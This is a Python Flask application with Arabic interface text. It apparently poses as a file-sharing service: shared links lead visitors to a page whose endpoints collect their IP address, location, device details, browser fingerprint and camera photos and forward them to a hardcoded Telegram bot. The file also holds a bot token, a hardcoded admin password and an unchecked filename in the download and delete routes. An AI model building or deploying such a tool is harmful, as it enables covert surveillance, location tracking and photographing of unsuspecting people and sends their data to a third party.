import os
import requests
from flask import Flask, render_template, request, redirect, url_for, send_file, session, flash, jsonify
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash
import logging
from datetime import datetime
import json

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

# Configuration
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'mkv'}
ADMIN_PASSWORD = 'naji123456789'

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '8075231551:AAGRl6IPLNqD4_M_m25PdXpPuYWF0950_-M'
TELEGRAM_CHAT_ID = '602747937'

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB max file size

# Create upload directory if it doesn't exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def send_telegram_message(message):
    """Send message to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=data)
        response.raise_for_status()
        logging.info("Telegram message sent successfully")
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")

def send_telegram_photo(photo_path, caption=""):
    """Send photo to Telegram bot"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'HTML'
            }
            files = {'photo': photo}
            response = requests.post(url, data=data, files=files)
            response.raise_for_status()
            logging.info("Telegram photo sent successfully")
    except Exception as e:
        logging.error(f"Failed to send Telegram photo: {e}")

@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        # Check if it's login or file upload
        if 'password' in request.form:
            # Handle login
            password = request.form['password']
            if password == ADMIN_PASSWORD:
                session['admin_logged_in'] = True
                flash('تم تسجيل الدخول بنجاح!', 'success')
                return redirect(url_for('admin'))
            else:
                flash('كلمة المرور غير صحيحة!', 'error')
        elif 'admin_logged_in' in session and session['admin_logged_in']:
            # Handle file upload
            if 'file' not in request.files:
                flash('لم يتم اختيار ملف!', 'error')
                return redirect(request.url)
            
            file = request.files['file']
            if file.filename == '':
                flash('لم يتم اختيار ملف!', 'error')
                return redirect(request.url)
            
            if file and file.filename and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                # Add timestamp to avoid name conflicts
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_")
                filename = timestamp + filename
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(filepath)
                
                # Create share link
                share_link = url_for('share_file', filename=filename, _external=True)
                flash(f'تم رفع الملف بنجاح! رابط المشاركة: {share_link}', 'success')
                
                # Store share link in session for display
                session['last_share_link'] = share_link
                
                return redirect(url_for('admin'))
            else:
                flash('نوع الملف غير مدعوم!', 'error')
    
    # Check if admin is logged in
    if 'admin_logged_in' not in session or not session['admin_logged_in']:
        return render_template('admin.html', login_required=True)
    
    # Get list of uploaded files
    uploaded_files = []
    if os.path.exists(UPLOAD_FOLDER):
        for filename in os.listdir(UPLOAD_FOLDER):
            if allowed_file(filename):
                filepath = os.path.join(UPLOAD_FOLDER, filename)
                file_size = os.path.getsize(filepath)
                file_size_mb = round(file_size / (1024 * 1024), 2)
                uploaded_files.append({
                    'filename': filename,
                    'size': file_size_mb,
                    'share_link': url_for('share_file', filename=filename, _external=True)
                })
    
    last_share_link = session.pop('last_share_link', None)
    
    return render_template('admin.html', 
                         login_required=False, 
                         uploaded_files=uploaded_files,
                         last_share_link=last_share_link)

@app.route('/admin/delete/<filename>')
def delete_file(filename):
    if 'admin_logged_in' not in session or not session['admin_logged_in']:
        return redirect(url_for('admin'))
    
    try:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if os.path.exists(filepath):
            os.remove(filepath)
            flash('تم حذف الملف بنجاح!', 'success')
        else:
            flash('الملف غير موجود!', 'error')
    except Exception as e:
        flash(f'خطأ في حذف الملف: {str(e)}', 'error')
    
    return redirect(url_for('admin'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    flash('تم تسجيل الخروج بنجاح!', 'success')
    return redirect(url_for('admin'))

@app.route('/share/<filename>')
def share_file(filename):
    # Check if file exists
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if not os.path.exists(filepath):
        return "الملف غير موجود", 404
    
    # Get file info
    file_size = os.path.getsize(filepath)
    file_size_mb = round(file_size / (1024 * 1024), 2)
    
    return render_template('share.html', 
                         filename=filename,
                         file_size=file_size_mb)

@app.route('/collect_data', methods=['POST'])
def collect_data():
    """Collect user data and send to Telegram"""
    try:
        data = request.json
        
        # Get IP address
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Format message for Telegram
        location_data = data.get('location', {}) if data else {}
        fingerprint_data = data.get('fingerprint', {}) if data else {}
        
        message = f"""
🔔 <b>بيانات زائر جديد</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🌐 <b>عنوان IP:</b> {ip_address}
📱 <b>نوع الجهاز:</b> {data.get('device_type', 'غير معروف') if data else 'غير معروف'}
🔗 <b>نوع الشبكة:</b> {data.get('network_type', 'غير معروف') if data else 'غير معروف'}
🗺️ <b>الموقع:</b> {location_data.get('city', 'غير معروف')}, {location_data.get('country', 'غير معروف')}
🖥️ <b>المتصفح:</b> {user_agent[:80] if user_agent else 'غير معروف'}...
🔍 <b>بصمة المتصفح:</b> {str(fingerprint_data)[:50] if fingerprint_data else 'غير معروف'}...
📄 <b>الملف:</b> {data.get('filename', 'غير معروف') if data else 'غير معروف'}
"""
        
        # Send to Telegram
        send_telegram_message(message)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logging.error(f"Error collecting data: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    """Handle photo upload from camera"""
    try:
        if 'photo' not in request.files:
            return jsonify({'status': 'error', 'message': 'No photo uploaded'}), 400
        
        photo = request.files['photo']
        if photo.filename == '':
            return jsonify({'status': 'error', 'message': 'No photo selected'}), 400
        
        # Save photo
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.jpg"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        photo.save(filepath)
        
        # Send to Telegram
        caption = f"📸 <b>صورة جديدة تم التقاطها</b>\n⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📁 <b>اسم الملف:</b> {filename}"
        send_telegram_photo(filepath, caption)
        
        return jsonify({'status': 'success', 'filename': filename})
        
    except Exception as e:
        logging.error(f"Error uploading photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/download/<filename>')
def download_file(filename):
    """Download file"""
    try:
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
        else:
            return "الملف غير موجود", 404
    except Exception as e:
        logging.error(f"Error downloading file: {e}")
        return "خطأ في تحميل الملف", 500

@app.route('/user')
def user():
    """User page - optional welcome page"""
    return render_template('user.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)